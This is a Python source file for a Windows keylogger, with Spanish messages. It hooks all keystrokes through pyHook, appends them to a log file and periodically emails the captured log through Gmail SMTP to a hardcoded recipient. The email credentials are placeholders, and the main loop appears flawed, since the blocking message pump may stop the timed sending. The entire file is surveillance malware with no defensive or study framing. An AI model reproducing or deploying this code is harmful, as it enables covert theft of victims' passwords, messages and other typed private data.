import pyHook,pythoncom,sys,logging
import time,datetime
import pythonwin.win32ui

wait_seconds=60
timeout=time.time()+wait_seconds
file_log='C:/Users/ydaga/Desktop/DataSiencepy/carpeta/dat.txt'

def TimeOut():
    if time.time()>timeout:
        return True
    else:
        return False
def SendEmail(user,pwd,recipient,subject,body):
    import smtplib
    gmail_user=user
    gmail_pass=pwd
    FROM= user
    TO= recipient if type(recipient) is list else [recipient]
    SUBJECT=subject
    TEXT=body
    message="""\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM,",".join(TO),SUBJECT,TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_pass)
        server.sendmail(FROM,TO,message)
        server.close()
        print("se envio correctamente")
    except:
        print ("error al mandar correo!") 
def FormatAndSendEmail():
    with open(file_log,'r+') as f:
        actualdate=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read().replace('\n','');
        data='log capturado a las '+ actualdate + '\n' + data
        SendEmail('ssssmail.com','password','ddddgmail.com',
                  'new log - '+actualdate,data)      
        f.seek(0)
        f.truncate()
             

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.keyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():       
        FormatAndSendEmail()
        print("test4")
        timeout=time.time()+wait_seconds
        
    pythoncom.PumpMessages()   
    
